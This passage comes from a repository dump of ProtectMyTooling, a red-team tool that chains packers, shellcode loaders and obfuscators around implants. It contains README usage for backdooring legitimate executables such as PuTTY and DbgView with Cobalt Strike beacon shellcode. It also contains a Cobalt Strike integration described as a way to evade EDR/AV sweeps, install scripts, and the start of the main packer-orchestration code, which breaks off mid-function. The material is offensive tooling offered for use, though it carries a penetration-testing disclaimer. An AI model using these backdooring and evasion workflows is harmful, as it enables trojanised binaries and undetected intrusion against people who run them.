31. [`VMProtect`](https://vmpsoft.com/) - protects code by executing it on a virtual machine with non-standard architecture that makes it extremely difficult to analyze and crack the software

You can quickly list supported packers using `-L` option (table columns are chosen depending on Terminal width, the wider the more information revealed):

```
C:\> py ProtectMyTooling.py -L
    [...]

    Red Team implants protection swiss knife.

    Multi-Packer wrapping around multitude of packers, protectors, shellcode loaders, encoders.
    Mariusz Banach / mgeeky '20-'22, <mb@binary-offensive.com>
    v0.16

+----+----------------+-------------+-----------------------+-----------------------------+------------------------+--------------------------------------------------------+
| #  |      Name      |     Type    |       Licensing       |            Input            |         Output         |                         Author                         |
+----+----------------+-------------+-----------------------+-----------------------------+------------------------+--------------------------------------------------------+
| 1  |     amber      | open-source |    Shellcode Loader   |              PE             |     EXE, Shellcode     |                       Ege Balci                        |
| 2  | asstrongasfuck | open-source |    .NET Obfuscator    |             .NET            |          .NET          |                 Charterino, klezVirus                  |
| 3  |  atompepacker  | open-source |  PE EXE/DLL Protector |              PE             |        EXE, DLL        |            ORCA (@ORCx41, ORCx41@gmail.com)            |
| 4  |    backdoor    | open-source |    Shellcode Loader   |          Shellcode          |           PE           |              Mariusz Banach, @mariuszbit               |
| 5  |    callobf     | open-source |  PE EXE/DLL Protector |              PE             |           PE           |                Mustafa Mahmoud, @d35ha                 |
| 6  |   confuserex   | open-source |    .NET Obfuscator    |             .NET            |          .NET          |                        mkaring                         |
| 7  |  donut-packer  | open-source |  Shellcode Converter  | PE, .NET, VBScript, JScript |       Shellcode        |                        TheWover                        |
| 8  |     enigma     |  commercial |  PE EXE/DLL Protector |              PE             |           PE           |          The Enigma Protector Developers Team          |
| 9  |     freeze     | open-source |    Shellcode Loader   |          Shellcode          |           PE           |                Matt Eidelberg (@Tyl0us)                |
| 10 |    hyperion    | open-source |  PE EXE/DLL Protector |              PE             |           PE           |                   nullsecurity team                    |
| 11 |  intellilock   |  commercial |    .NET Obfuscator    |              PE             |           PE           |                         Eziriz                         |
| 12 |     invobf     | open-source | Powershell Obfuscator |          Powershell         |       Powershell       |                    Daniel Bohannon                     |
| 13 |    logicnet    | open-source |    .NET Obfuscator    |             .NET            |          .NET          |                 AnErrupTion, klezVirus                 |
| 14 |     mangle     | open-source |   Executable Signing  |              PE             |           PE           |                Matt Eidelberg (@Tyl0us)                |
| 15 |     mpress     |   freeware  | PE EXE/DLL Compressor |              PE             |           PE           |                    Vitaly Evseenko                     |
| 16 |   netreactor   |  commercial |    .NET Obfuscator    |             .NET            |          .NET          |                         Eziriz                         |
| 17 |   netshrink    | open-source |    .NET Obfuscator    |             .NET            |          .NET          |                     Bartosz Wójcik                     |
| 18 |   nimcrypt2    | open-source |    Shellcode Loader   |     PE, .NET, Shellcode     |           PE           |                       @icyguider                       |
| 19 |    nimpackt    | open-source |    Shellcode Loader   |       .NET, Shellcode       |           PE           |             Cas van Cooten (@chvancooten)              |
| 20 |   nimsyscall   | sponsorware |    Shellcode Loader   |     PE, .NET, Shellcode     |           PE           |                    @S3cur3Th1sSh1t                     |
| 21 |    packer64    | open-source | PE EXE/DLL Compressor |              PE             |           PE           |                  John Adams, @jadams                   |
| 22 |     pe2shc     | open-source |  Shellcode Converter  |              PE             |       Shellcode        |                      @hasherezade                      |
| 23 |    pecloak     | open-source |  PE EXE/DLL Protector |              PE             |           PE           |     Mike Czumak, @SecuritySift, buherator / v-p-b      |
| 24 |    peresed     | open-source |  PE EXE/DLL Protector |              PE             |           PE           |                  Martin Vejnár, Avast                  |
| 25 |    peunion     |   freeware  | PE EXE/DLL Compressor |           PE, .NET          |           PE           |  Martin Fischer / bytecode77 <mail@martinfischer.it>   |
| 26 |   scarecrow    | open-source |    Shellcode Loader   |          Shellcode          | DLL, JScript, CPL, XLL |                Matt Eidelberg (@Tyl0us)                |
| 27 |      sgn       | open-source |   Shellcode Encoder   |          Shellcode          |       Shellcode        |                       Ege Balci                        |
| 28 | smartassembly  |  commercial |    .NET Obfuscator    |             .NET            |          .NET          |                        Red-Gate                        |
| 29 |      srdi      | open-source |   Shellcode Encoder   |             DLL             |       Shellcode        |                Nick Landers, @monoxgas                 |
| 30 |    themida     |  commercial |  PE EXE/DLL Protector |              PE             |           PE           |                         Oreans                         |
| 31 |      upx       | open-source | PE EXE/DLL Compressor |              PE             |           PE           | Markus F.X.J. Oberhumer, László Molnár, John F. Reiser |
| 32 |   vmprotect    |  commercial |  PE EXE/DLL Protector |              PE             |           PE           |                        vmpsoft                         |
+----+----------------+-------------+-----------------------+-----------------------------+------------------------+--------------------------------------------------------+
```

Above are the packers that are supported, but that doesn't mean that you have them configured and ready to use.
To prepare their usage, you must first supply necessary binaries to the `contrib` directory and then configure your YAML file accordingly.

# RedWatermarker - built-in Artifact watermarking

## Artifact watermarking & IOC collection

This program is intended for professional Red Teams and is perfect to be used in a typical implant-development CI/CD pipeline.
As a red teamer I'm always expected to deliver decent quality list of IOCs matching back to all of my implants as well as I find it essential to watermark all my implants for bookkeeping, attribution and traceability purposes.

To accommodate these requirements, ProtectMyTooling brings basic support for them.

### Artifact Watermarking

`ProtectMyTooling` can apply watermarks after obfuscation rounds simply by using `--watermark` option.:

```
py ProtectMyTooling [...] -w dos-stub=fooooobar -w checksum=0xaabbccdd -w section=.coco,ALLYOURBASEAREBELONG
```

There is also a standalone approach, included in `RedWatermarker.py` script.

It takes executable artifact on input and accepts few parameters denoting where to inject a watermark and what value shall be inserted.

Example run will set PE Checksum to 0xAABBCCDD, inserts `foooobar` to PE file's DOS Stub (bytes containing _This program cannot be run..._), appends `bazbazbaz` to file's overlay and then create a new PE section named `.coco` append it to the end of file and fill that section with preset marker.

```
py RedWatermarker.py beacon-obf.exe -c 0xaabbccdd -t fooooobar -e bazbazbaz -s .coco,ALLYOURBASEAREBELONG
```

Full watermarker usage:

```
cmd> py RedWatermarker.py --help

                      ;
                      ED.
                     ,E#Wi
  j.               f#iE###G.
  EW,            .E#t E#fD#W;
  E##j          i#W,  E#t t##L
  E###D.       L#D.   E#t  .E#K,
  E#jG#W;    :K#Wfff; E#t    j##f
  E#t t##f   i##WLLLLtE#t    :E#K:
  E#t  :K#E:  .E#L    E#t   t##L
  E#KDDDD###i   f#E:  E#t .D#W;                  ,;                                                      G:              ,;
  E#f,t#Wi,,,    ,WW; E#tiW#G.                 f#i j.                                          j.        E#,    :      f#i j.
  E#t  ;#W: ;     .D#;E#K##i .. GEEEEEEEL    .E#t  EW,                 ..       :           .. EW,       E#t  .GE    .E#t  EW,
  DWi   ,K.DL       ttE##D. ;W, ,;;L#K;;.   i#W,   E##j               ,W,     .Et          ;W, E##j      E#t j#K;   i#W,   E##j
  f.     :K#L     LWL E#t  j##,    t#E     L#D.    E###D.            t##,    ,W#t         j##, E###D.    E#GK#f    L#D.    E###D.
  EW:   ;W##L   .E#f  L:  G###,    t#E   :K#Wfff;  E#jG#W;          L###,   j###t        G###, E#jG#W;   E##D.   :K#Wfff;  E#jG#W;
  E#t  t#KE#L  ,W#;     :E####,    t#E   i##WLLLLt E#t t##f       .E#j##,  G#fE#t      :E####, E#t t##f  E##Wi   i##WLLLLt E#t t##f
  E#t f#D.L#L t#K:     ;W#DG##,    t#E    .E#L     E#t  :K#E:    ;WW; ##,:K#i E#t     ;W#DG##, E#t  :K#E:E#jL#D:  .E#L     E#t  :K#E:
  E#jG#f  L#LL#G      j###DW##,    t#E      f#E:   E#KDDDD###i  j#E.  ##f#W,  E#t    j###DW##, E#KDDDD###E#t ,K#j   f#E:   E#KDDDD###i
  E###;   L###j      G##i,,G##,    t#E       ,WW;  E#f,t#Wi,,,.D#L    ###K:   E#t   G##i,,G##, E#f,t#Wi,,E#t   jD    ,WW;  E#f,t#Wi,,,
  E#K:    L#W;     :K#K:   L##,    t#E        .D#; E#t  ;#W: :K#t     ##D.    E#t :K#K:   L##, E#t  ;#W: j#t          .D#; E#t  ;#W:
  EG      LE.     ;##D.    L##,     fE          tt DWi   ,KK:...      #G      .. ;##D.    L##, DWi   ,KK: ,;            tt DWi   ,KK:
  ;       ;@      ,,,      .,,       :                                j          ,,,      .,,


    Watermark thy implants, track them in VirusTotal
    Mariusz Banach / mgeeky '22, (@mariuszbit)
    <mb@binary-offensive.com>

usage: RedWatermarker.py [options] <infile>

options:
  -h, --help            show this help message and exit

Required arguments:
  infile                Input implant file

Optional arguments:
  -C, --check           Do not actually inject watermark. Check input file if it contains specified watermarks.
  -v, --verbose         Verbose mode.
  -d, --debug           Debug mode.
  -o PATH, --outfile PATH
                        Path where to save output file with watermark injected. If not given, will modify infile.

PE Executables Watermarking:
  -t STR, --dos-stub STR
                        Insert watermark into PE DOS Stub (This program cannot be run...).
  -c NUM, --checksum NUM
                        Preset PE checksum with this value (4 bytes). Must be number. Can start with 0x for hex value.
  -e STR, --overlay STR
                        Append watermark to the file's Overlay (at the end of the file).
  -s NAME,STR, --section NAME,STR
                        Append a new PE section named NAME and insert watermark there. Section name must be shorter than 8 characters. Section will be marked Read-Only, non-executable.
```

Currently only PE files watermarking is supported, but in the future Office documents and other formats are to be added as well.


### IOCs Collection

IOCs may be collected by simply using `-i` option in `ProtectMyTooling` run.

They're being collected at the following phases:

- on the input file
- after each obfuscation round on an intermediary file
- on the final output file

They will contain following fields saved in form of a CSV file:

- `timestamp`
- `filename`
- `author` - formed as `username@hostname`
- `context` - whether a record points to an input, output or intermediary file
- `comment` - value adjusted by the user through `-I value` option
- `md5`
- `sha1`
- `sha256`
- `imphash` - PE Imports Hash, if available
- (TODO) `typeref_hash` - .NET TypeRef Hash, if available

Resulting will be a CSV file named `outfile-ioc.csv` stored side by side to generated output artifact. That file is written in APPEND mode, meaning it will receive all subsequent IOCs.


# RedBackdoorer - built-in PE Backdooring

`ProtectMyTooling` utilizes my own `RedBackdoorer.py` script which provides few methods for backdooring PE executables.
Support comes as a dedicated packer named `backdoor`. Example usage:

**Takes Cobalt Strike shellcode on input and encodes with SGN (Shikata Ga-Nai) then backdoors SysInternals DbgView64.exe then produces Amber EXE reflective loader**

```
PS> py ProtectMyTooling.py sgn,backdoor,amber beacon64.bin dbgview64-infected.exe -B dbgview64.exe

    ::::::::::.:::::::..      ...  :::::::::::.,::::::  .,-::::::::::::::::
     `;;;```.;;;;;;``;;;;  .;;;;;;;;;;;;;;;;;;;,;;;'````;;;;;;;;
      `]]nnn]]' [[[,/[[[' ,[[     \[[,  [[     [[cccc [[[           [[
       $$$""    $$$$$$c   $$$,     $$$  $$     $$"""" $$$           $$
       888o     888b "88bo"888,_ _,88P  88,    888oo,_`88bo,__,o,   88,
    .  YMMMb :.-:.MM   ::-. "YMMMMMP"   MMM    """"YUMMM"YUMMMMMP"  MMM
    ;;,.    ;;;';;.   ;;;;'
    [[[[, ,[[[[, '[[,[[['
    $$$$$$$$"$$$   c$$"
    888 Y88" 888o,8P"`
    ::::::::::::mM...        ...     :::    :::::.    :::. .,-:::::/
    ;;;;;;;;.;;;;;;;.  .;;;;;;;.  ;;;    ;;`;;;;,  `;;,;;-'````'
         [[   ,[[     \[[,[[     \[[,[[[    [[[ [[[[[. '[[[[   [[[[[[/
         $$   $$$,     $$$$$,     $$$$$'    $$$ $$$ "Y$c$"$$c.    "$$
         88,  "888,_ _,88"888,_ _,88o88oo,._888 888    Y88`Y8bo,,,o88o
         MMM    "YMMMMMP"  "YMMMMMP"""""YUMMMMM MMM     YM  `'YMUP"YMM

    Red Team implants protection swiss knife.

    Multi-Packer wrapping around multitude of packers, protectors, shellcode loaders, encoders.
    Mariusz Banach / mgeeky '20-'22, <mb@binary-offensive.com>
    v0.16

[.] Processing x64 file :  beacon64.bin
[>] Generating output of sgn(<file>)...
[>] Generating output of backdoor(sgn(<file>))...
[>] Generating output of Amber(backdoor(sgn(<file>)))...

[+] SUCCEEDED. Original file size: 265959 bytes, new file size Amber(backdoor(sgn(<file>))): 1372672, ratio: 516.12%
```

Full RedBackdoorer usage:

```
cmd> py RedBackdoorer.py --help

     ██▀███ ▓█████▓█████▄
    ▓██ ▒ ██▓█   ▀▒██▀ ██▌
    ▓██ ░▄█ ▒███  ░██   █▌
    ▒██▀▀█▄ ▒▓█  ▄░▓█▄   ▌
    ░██▓ ▒██░▒████░▒████▓
    ░ ▒▓ ░▒▓░░ ▒░ ░▒▒▓  ▒
      ░▒ ░ ▒░░ ░  ░░ ▒  ▒
      ░░   ░   ░   ░ ░  ░
     ▄▄▄▄   ▄▄▄░  ░  ▄████▄  ██ ▄█▓█████▄ ▒█████  ▒█████  ██▀███ ▓█████ ██▀███
    ▓█████▄▒████▄  ░▒██▀ ▀█  ██▄█▒▒██▀ ██▒██▒  ██▒██▒  ██▓██ ▒ ██▓█   ▀▓██ ▒ ██▒
    ▒██▒ ▄█▒██  ▀█▄ ▒▓█    ▄▓███▄░░██   █▒██░  ██▒██░  ██▓██ ░▄█ ▒███  ▓██ ░▄█ ▒
    ▒██░█▀ ░██▄▄▄▄██▒▓▓▄ ▄██▓██ █▄░▓█▄   ▒██   ██▒██   ██▒██▀▀█▄ ▒▓█  ▄▒██▀▀█▄
    ░▓█  ▀█▓▓█   ▓██▒ ▓███▀ ▒██▒ █░▒████▓░ ████▓▒░ ████▓▒░██▓ ▒██░▒████░██▓ ▒██▒
    ░▒▓███▀▒▒▒   ▓▒█░ ░▒ ▒  ▒ ▒▒ ▓▒▒▒▓  ▒░ ▒░▒░▒░░ ▒░▒░▒░░ ▒▓ ░▒▓░░ ▒░ ░ ▒▓ ░▒▓░
    ▒░▒   ░  ▒   ▒▒ ░ ░  ▒  ░ ░▒ ▒░░ ▒  ▒  ░ ▒ ▒░  ░ ▒ ▒░  ░▒ ░ ▒░░ ░  ░ ░▒ ░ ▒░
     ░    ░  ░   ▒  ░       ░ ░░ ░ ░ ░  ░░ ░ ░ ▒ ░ ░ ░ ▒   ░░   ░   ░    ░░   ░
     ░           ░  ░ ░     ░  ░     ░       ░ ░     ░ ░    ░       ░  ░  ░
          ░         ░              ░


    Your finest PE backdooring companion.
    Mariusz Banach / mgeeky '22, (@mariuszbit)
    <mb@binary-offensive.com>

usage: RedBackdoorer.py [options] <mode> <shellcode> <infile>

options:
  -h, --help            show this help message and exit

Required arguments:
  mode                  PE Injection mode, see help epilog for more details.
  shellcode             Input shellcode file
  infile                PE file to backdoor

Optional arguments:
  -o PATH, --outfile PATH
                        Path where to save output file with watermark injected. If not given, will modify infile.
  -v, --verbose         Verbose mode.

Backdooring options:
  -n NAME, --section-name NAME
                        If shellcode is to be injected into a new PE section, define that section name. Section name must not be longer than 7 characters. Default: .qcsw
  -i IOC, --ioc IOC     Append IOC watermark to injected shellcode to facilitate implant tracking.

Authenticode signature options:
  -r, --remove-signature
                        Remove PE Authenticode digital signature since its going to be invalidated anyway.

------------------

PE Backdooring <mode> consists of two comma-separated options.
First one denotes where to store shellcode, second how to run it:

<mode>

    save,run
      |   |
      |   +---------- 1 - change AddressOfEntryPoint
      |               2 - hijack branching instruction at Original Entry Point (jmp, call, ...)
      |               3 - setup TLS callback
      |
      +-------------- 1 - store shellcode in the middle of a code section
                      2 - append shellcode to the PE file in a new PE section
Example:

    py RedBackdoorer.py 1,2 beacon.bin putty.exe putty-infected.exe
```

# Cobalt Strike Integration

There is also a script that integrates `ProtectMyTooling.py` used as a wrapper around configured PE/.NET Packers/Protectors in order to easily transform input executables into their protected and compressed output forms and then upload or use them from within CobaltStrike.

The idea is to have an automated process of protecting all of the uploaded binaries or .NET assemblies used by execute-assembly and forget about protecting or obfuscating them manually before each usage. The added benefit of an automated approach to transform executables is the ability to have the same executable protected each time it's used, resulting in unique samples launched on target machines. That should nicely deceive EDR/AV enterprise-wide IOC sweeps while looking for the same artefact on different machines.

Additionally, the protected-execute-assembly command has the ability to look for assemblies of which
only name were given in a preconfigured assemblies directory (set in dotnet_assemblies_directory setting).

To use it:

1. Load `CobaltStrike/ProtectMyTooling.cna` in your Cobalt Strike.
2. Go to the menu and setup all the options

![options](images/options.png)

3. Then in your Beacon's console you'll have following commands available:

  * `protected-execute-assembly` - Executes a local, previously protected and compressed .NET program in-memory on target.
  * `protected-upload` - Takes an input file, protects it if its PE executable and then uploads that file to specified remote location.
  * `bofnet_load_protected` - Takes input .NET assembly file, passes it through configured .NET packers chain, loads generated output with `bofnet_load`. [BOFNET](https://github.com/CCob/BOF.NET/) needs to be loaded separetely for this to work.

Basically these commands will open input files, pass the firstly to the `CobaltStrike/cobaltProtectMyTooling.py` script, which in turn calls out to `ProtectMyTooling.py`. As soon as the binary gets obfuscated, it will be passed to your beacon for execution/uploading.

## Cobalt Strike related Options

Here's a list of options required by the Cobalt Strike integrator:

* `python3_interpreter_path` - Specify a path to Python3 interpreter executable
* `protect_my_tooling_dir` - Specify a path to ProtectMyTooling main directory
* `protect_my_tooling_config` - Specify a path to ProtectMyTooling configuration file with various packers options
* `dotnet_assemblies_directory` - Specify local path .NET assemblies should be looked for if not found by execute-assembly
* `cache_protected_executables` - Enable to cache already protected executables and reuse them when needed
* `protected_executables_cache_dir` - Specify a path to a directory that should store cached protected executables
* `default_exe_x86_packers_chain` - Native x86 EXE executables protectors/packers chain
* `default_exe_x64_packers_chain` - Native x64 EXE executables protectors/packers chain
* `default_dll_x86_packers_chain` - Native x86 DLL executables protectors/packers chain
* `default_dll_x64_packers_chain` - Native x64 DLL executables protectors/packers chain
* `default_dotnet_packers_chain` - .NET executables protectors/packers chain

---

## Known Issues

- `ScareCrow` is very tricky to run from Windows. What worked for me is following:
  1. Run on Windows 10 and have WSL installed (`bash.exe` command available in Windows)
  2. Have `golang` installed in WSL at version `1.16+` (tested on `1.18`)
  3. Make sure to have `PackerScareCrow.Run_ScareCrow_On_Windows_As_WSL = True` set

---

## Credits due & used technology

- All packer, obfuscator, converter, loader credits goes to their authors. This tool is merely a wrapper around their technology!
  - Hopefully none of them mind me adding such wrappers. Should there be concerns - please reach out to me.

- _ProtectMyTooling_ also uses [`denim.exe`](https://github.com/moloch--/denim) by **moloch--** by some Nim-based packers.


---

## TODO

- Write custom PE injector and offer it as a "protector"
- Add watermarking to other file formats such as Office documents, WSH scripts (VBS, JS, HTA) and containers
- Add support for a few other Packers/Loaders/Generators in upcoming future:
  - [`GadgetToJScript`](https://github.com/med0x2e/GadgetToJScript)
  - [`Limelighter`](https://github.com/Tylous/Limelighter)
  - [`PEZor`](https://github.com/phra/PEzor)
  - [`msfevenom`](https://github.com/rapid7/metasploit-framework) - two variants, one for input shellcode, the other for executable

---

## Disclaimer

Use of this tool as well as any other projects I'm author of for illegal purposes, unsolicited hacking, cyber-espionage is strictly prohibited.
This and other tools I distribute help professional Penetration Testers, Security Consultants, Security Engineers and other security personnel in improving their customer networks cyber-defence capabilities.
In no event shall the authors or copyright holders be liable for any claim, damages or other liability arising from illegal use of this software.

If there are concerns, copyright issues, threats posed by this software or other inquiries - I am open to collaborate in responsibly addressing them.

The tool exposes handy interface for using mostly open-source or commercially available packers/protectors/obfuscation software, therefore not introducing any immediately new threats to the cyber-security landscape as is.

---

### ☕ Show Support ☕

This and other projects are outcome of sleepless nights and **plenty of hard work**. If you like what I do and appreciate that I always give back to the community,
[Consider buying me a coffee](https://github.com/sponsors/mgeeky) _(or better a beer)_ just to say thank you! 💪

---

## Author

```
   Mariusz Banach / mgeeky, '20-'22
   <mb [at] binary-offensive.com>
   (https://github.com/mgeeky)
```



================================================
FILE: install.ps1
================================================

Write-Host "`n== Step 1: Installing pip3 dependencies...`n" -ForegroundColor cyan
pip3 install -r requirements.txt

if ((Get-Command "python2" -ErrorAction SilentlyContinue) -eq $null)
{
    Write-Host "`nWARNING: Some packers work only on Python2 which you seem to not have installed. Consider installing it to use: peCloakCapstone`n" -ForegroundColor yellow
}

if ((Get-Command "nim.exe" -ErrorAction SilentlyContinue) -eq $null)
{
    Write-Host "`nERROR: For Nim-related packers to work, you need to install Nim on your Windows! Consider using Chocolatey manager: choco install nim -y`n" -ForegroundColor green
}
else
{
    Write-Host "`n== Step 2a: Installs nim dependencies...`n" -ForegroundColor cyan
    nimble -y install winim nimcrypto docopt ptr_math strenc

    Write-Host "`n== Step 2b: Installs denim.exe (github.com/moloch--/denim) dependencies...`n" -ForegroundColor cyan
    .\contrib\denim\denim.exe setup
}

if ((Get-Command "bash.exe" -ErrorAction SilentlyContinue) -eq $null)
{
    Write-Host "`nWARNING: You don't seem to have Bash.exe in your Windows (no WSL installed?). Some linux-native packers might not work: ScareCrow`n"  -ForegroundColor green
}
else
{
    Write-Host "`n`n== Step 3: Installing Linux dependencies (via WSL bash.exe). You'll be asked for sudo password...`n`n" -ForegroundColor cyan
    bash.exe -c "sudo apt install -y dos2unix ; dos2unix install.sh"
    bash.exe install.sh
}

Write-Host "`n`nOK: You should be all set now.`n"
Write-Host "`nEnjoy ProtectMyTooling - and let me know the coolest/most effective packers-chain you come up with! :-)`n" -ForegroundColor green



================================================
FILE: install.sh
================================================
#!/bin/bash

sudo apt update

sudo apt upgrade -y

sudo apt install python3 python3-dev nim=1.6.2 mingw-64=8.0.0-1 golang=2:1.18~3 -y

pip3 install -r requirements.txt

nimble install nimcrypto docopt ptr_math strenc winim



================================================
FILE: ProtectMyTooling.py
================================================
#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
# Author:
#   Mariusz Banach / mgeeky, '20-'23
#   <mb [at] binary-offensive.com>
#   (https://github.com/mgeeky)
#

from RedWatermarker import PeWatermarker
from lib.utils import *
from lib.logger import Logger
from lib.packersloader import PackersLoader
import lib.optionsparser
import atexit
import pprint
import time
import glob
import shutil
import pefile
import sys
import os

VERSION = '0.19'

options = {
    'debug': False,
    'verbose': False,
    'silent': False,
    'colors': True,
    'config': '',
    'timeout': 60,
    'arch': '',
    'log': None,
    'packers': '',
    'packer_class_name': 'Packer\\w+',
    'watermark': [],
    'ioc': False,
    'custom_ioc': '',
    'ioc_path': '',
}

logger = None
packersloader = None
av_enable_status = -1


def init():
    global logger
    global options
    global packersloader

    logger = Logger()

    opts = lib.optionsparser.parse_options(logger, options, VERSION)
    options.update(opts)

    logger = Logger(options)
    packersloader = PackersLoader(logger, options)

    for name, plugin in packersloader.get_packers().items():
        plugin.logger = logger
        plugin.help(None)

    logger.dbg('Dumping all of the options specified:\n')
    logger.dbg(pprint.pformat(options))

    return True


def launchPacker(arch, packer, infile, outfile):
    keys = [x.lower() for x in lib.utils.RenamePackerNameToPackerFile.keys()]
    if packer in keys:
        packer = lib.utils.RenamePackerNameToPackerFile[packer]

    if not packer in packersloader.get_packers().keys():
        logger.fatal(
            'Requested packer ({}) was not loaded! Fatal error.'.format(packer))

    return packersloader[packer].process(arch, infile, outfile)


def getFileArch(infile):
    pe = None
    try:
        if options['arch'] != '':
            return options['arch']

        if lib.utils.isShellcode(infile):
            if '64' in infile:
                logger.info('Deduced from input file name x64 architecture.')
                return 'x64'

            elif '86' in infile or '32' in infile:
                logger.info('Deduced from input file name x86 architecture.')
                return 'x86'

            logger.fatal(
                'Could not deduce shellcode architecture. Use --arch to set it up.')

        pe = pefile.PE(infile, fast_load=True)
        arch = 'x86' if (pe.FILE_HEADER.Machine ==
                         pefile.MACHINE_TYPE['IMAGE_FILE_MACHINE_I386']) else 'x64'

    except pefile.PEFormatError as e:
        logger.fatal(
            'Could not detect input file\'s architecture. Please specify it using --arch!')

    finally:
        if pe:
            pe.close()

    return arch


def injectWatermark(outfile):
    try:
        if len(options['watermark']) == 0:
            return False

        temp = tempfile.NamedTemporaryFile(delete=False)
        shutil.copy(outfile, temp.name)

        opts = {
            'verbose': options['verbose'],
            'debug': options['debug'],
            'check': False,
        }

        for k in lib.optionsparser.AvailableWatermarkSpots:
            k = k.replace('-', '_')
            if k == 'checksum':
                opts[k] = 0
                continue

            opts[k] = ''

        for watermark in options['watermark']:
            spot, marker = watermark.split('=')
            spot = spot.replace('-', '_')

            if 'checksum' == spot:
                try:
                    marker = marker.lower()
                    base = 10

                    if marker.startswith('0x') or \
                        'a' in marker or 'b' in marker or 'c' in marker or \
                            'd' in marker or 'e' in marker or 'f' in marker:
                        base = 16

                    num = int(marker, base)

                    if num >= 2**32:
                        logger.fatal(
                            'Specified checksum number in --watermark is too large! Must be no bigger than 2^32-1 (0xffffffff)!')

                    opts[spot] = num

                except Exception as e:
                    logger.fatal(
                        'Invalid --watermark checksum=NUM value, could not be casted to integer!')
            else:
                opts[spot] = marker

        pewat = PeWatermarker(opts, logger, outfile, temp.name)
        result = pewat.watermark()

        if result:
            logger.ok('Successfully watermarked resulting artifact file.')
            shutil.copy(temp.name, outfile)
        else:
            logger.err('Could not watermark resulting artifact file.')

        return result

    except Exception as e:
        raise
        return False

    finally:
        temp.close()
        os.unlink(temp.name)


def validateOutfile(outfile):
    return os.path.isfile(outfile)

    pe = None
    try:
        pe = pefile.PE(outfile)

        logger.info('Output looks like a valid PE. Should be good to go.')
        return True

    except pefile.PEFormatError as e:
        logger.err(
            'Output file validation failed as it has corrupted PE structure: ' + str(e))
        return False

    finally:
        if pe:
            pe.close()


def testRun(outfile):
    print('\n\nRunning application to test it...\n')
    print(shell(logger, '"{}" {}'.format(outfile, options['cmdline'])))


def processFile(singleFile, infile, _outfile):
    result = False

    iocsCollected = []

    if options['ioc']:
        iocsCollected.append(lib.utils.collectIOCs(
            infile, 'Input File', options['custom_ioc']))

    try:
        tmps = []
        checkArch = True
        packersOrder = options['packers'].split(',')

        for i in range(len(packersOrder)):
            packer = packersOrder[i].strip()

            if not packersloader[packer].validate_file_architecture():
                checkArch = False
                if (options['verbose'] or options['debug']):
                    logger.info(
                        f'Packer {packer} requested not to verify file\'s architecture.')
                break

        if checkArch:
            arch = getFileArch(infile)
        else:
            arch = ''

        origFileSize = os.path.getsize(infile)

        print('[.] Processing {} file :  {}'.format(arch, infile))
        packersChain = '<file>'

        for i in range(len(packersOrder)):
            packer = packersOrder[i].strip()

            if i + 1 < len(packersOrder):
                outfile = get_tempfile_name('.bin')
                tmps.append(outfile)
            else:
                outfile = _outfile

            packersChain = '{}({})'.format(
                packersloader[packer].get_name(), packersChain)

            if (options['verbose'] or options['debug']) and singleFile:
                print('''
=================================================
[.] Generating output of {}...
=================================================
    '''.format(packersChain))
            else:
                logger.info('[>] Generating output of {}...'.format(
                    packersChain), forced=True, noprefix=True, color='yellow')

            logger.dbg('\tinfile  < "{}"'.format(infile))
            logger.dbg('\toutfile > "{}"'.format(outfile))

            form = getFileFormat(infile)
            if form == '':
                form = 'nothing really'

            logger.info(f'Input file format resembles: {form}', color='yellow')

            if not os.path.isfile(infile):
                if singleFile:
                    logger.fatal(
                        'For some reason input file no longer exists (maybe AV kicked in?). FATAL.')
                else:
                    logger.err(
                        'For some reason input file no longer exists (maybe AV kicked in?)')
                    return

            if not launchPacker(arch, packer, infile, outfile):
                hint = ''

                if i > 0:
                    hint = ' Maybe previous packers ({}) returned a PE file that is not digestible by {}?'.format(
                        ','.join(packersOrder[:i]), packer
                    )

                if singleFile:
                    logger.fatal('Packer ({}) failed.{}'.format(packer, hint))
                else:
                    logger.err('Packer ({}) failed.{}'.format(packer, hint))
            else:
                result = True

                if options['ioc']:
                    iocsCollected.append(lib.utils.collectIOCs(
                        outfile, 'Obfuscation artifact: ' + packersChain, options['custom_ioc']))

            if not os.path.isfile(outfile):
                if singleFile:
                    logger.fatal(
                        'Output file does not exist (maybe AV kicked in?). FATAL.')
                else:
                    logger.err(
                        'Output file does not exist (maybe AV kicked in?)')
                    return

            form = getFileFormat(outfile)
            if form == '':
                form = 'nothing really'

            logger.info(f'Output file format resembles: {form}', color='cyan')

            infile = outfile

        for t in tmps:
            logger.dbg('Removing intermediary file: {}'.format(t))
            try:
                os.remove(t)
            except Exception as e:
                logger.err(
                    f'Could not remove intermediary file: {t}\n\tException thrown: {e}')

        if result:
            logger.info(f'''
[+] File packed.
    Generated output : {_outfile}''', noprefix=True)

    except Exception as e:
        raise

    if len(options['watermark']) > 0:
        logger.info('Injecting watermark...')
        injectWatermark(_outfile)

    if result and validateOutfile(_outfile):
        newFileSize = os.path.getsize(_outfile)

        if options['hide_console']:
            changePESubsystemToGUI(_outfile)

        if options['ioc']:
            iocsCollected.append(lib.utils.collectIOCs(
                _outfile, 'Output obfuscated artifact', options['custom_ioc']))

            path, ext = os.path.splitext(outfile)
            iocName = path + '-ioc.csv'

            if len(options['ioc_path']) > 0:
                iocName = options['ioc_path']

            fileExists = os.path.isfile(iocName)

            with open(iocName, 'a') as f:
                columns = (
                    'timestamp',
                    'filename',
                    'author',
                    'context',
                    'comment',
                    'md5',
                    'sha1',
                    'sha256',
                    'imphash',
                    # 'typeref_hash',
                )

                if not fileExists:
                    f.write(','.join(columns) + '\n')

                for e in iocsCollected:
                    elems = []
                    for col in columns:
                        elems.append(e[col])

                    f.write(','.join(elems) + '\n')

            logger.ok(f'IOCs written to: {iocName}')

        if (options['verbose'] or options['debug']) and singleFile:
            logger.ok('''
++++++++++++++++++++++++++++++++++++++++++++++++++++
[+] SUCCEEDED. Original file size: {} bytes, new file size {}: {}, ratio: {:.2f}%
++++++++++++++++++++++++++++++++++++++++++++++++++++
'''.format(
                origFileSize, packersChain, newFileSize,
                ((float(newFileSize) / origFileSize * 100.0))
            ), noprefix=True)

        else:
            logger.ok('\n[+] SUCCEEDED. Original file size: {} bytes, new file size {}: {}, ratio: {:.2f}%'.format(
                origFileSize, packersChain, newFileSize,
                ((float(newFileSize) / origFileSize * 100.0))
            ), noprefix=True)

        if singleFile and options['testrun']:
            testRun(outfile)

        return 0

    else:
        logger.err('\n[-] Something went wrong with ({})!'.format(
            os.path.basename(infile)
        ), noprefix=True)
        return 1


def processDir(infile, outdir):
    patterns = (
        os.path.join(infile, '*.exe'),
        os.path.join(infile, '*.dll'),
        os.path.join(infile, '*.cpl'),
        os.path.join(infile, '*.xll'),
        #os.path.join(infile, '*.scr'),
